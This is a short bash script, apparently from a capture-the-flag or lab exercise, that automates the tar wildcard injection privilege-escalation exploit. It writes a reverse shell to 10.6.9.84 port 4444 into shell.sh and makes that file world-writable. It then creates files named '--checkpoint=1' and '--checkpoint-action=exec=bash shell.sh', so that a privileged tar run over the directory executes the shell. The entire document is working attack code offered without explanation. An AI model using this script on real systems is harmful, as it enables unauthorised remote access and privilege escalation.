#!/bin/bash

#automatically sets up the tar wildcard exploit
echo $tarLocation
touch shell.sh
chmod 777 shell.sh
echo "/bin/bash -i >& /dev/tcp/10.6.9.84/4444 0>&1" > shell.sh
cat shell.sh
touch $(pwd)/--checkpoint=1
touch $(pwd)/--checkpoint-action=exec=bash\ shell.sh
ls